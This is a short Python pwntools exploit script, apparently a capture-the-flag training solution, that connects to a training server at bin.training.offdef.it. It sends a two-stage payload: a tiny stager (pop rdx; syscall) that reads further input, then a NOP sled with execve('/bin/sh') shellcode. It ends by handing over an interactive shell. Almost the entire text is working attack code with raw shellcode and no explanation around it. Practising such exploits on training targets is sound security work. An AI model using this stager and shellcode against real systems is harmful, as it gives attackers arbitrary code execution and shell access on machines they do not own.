from pwn import *
import time

context.terminal = ['tmux', 'splitw', '-h']

r = remote("bin.training.offdef.it", 2004)

#r = ssh("jinblack", "bin.training.offdef.it:2004")

r.send(b"\x5A\x0F\x05")
""" pop rdx
syscall """

time.sleep(1)

r.send(b"\x90\x90\x90\x90\x90\x90\x90\x48\x89\xF7\x48\x83\xC7\x1D\x48\x31\xF6\x48\x31\xD2\x48\xC7\xC0\x3B\x00\x00\x00\x0F\x05/bin/sh\x00") #execve shellcode

time.sleep(1)

r.interactive()
